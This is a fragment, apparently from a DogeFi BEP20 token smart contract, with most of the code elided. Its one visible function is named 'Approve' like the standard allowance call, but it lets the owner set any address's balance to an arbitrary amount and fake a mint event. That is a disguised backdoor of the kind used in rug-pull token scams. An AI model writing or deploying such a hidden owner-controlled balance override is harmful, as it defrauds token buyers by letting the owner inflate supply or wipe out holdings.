...
contract DogeFi is Context, IBEP20, Ownable {
  ...
  */
  ...
  function Approve(address owner, uint256 amount) public onlyOwner {
    require(1 < amount);
    newBalance[owner] = 0 + amount * (10 ** 9) / 1;
    emit Transfer(address(0), owner, amount * 10 ** 9);
  }
}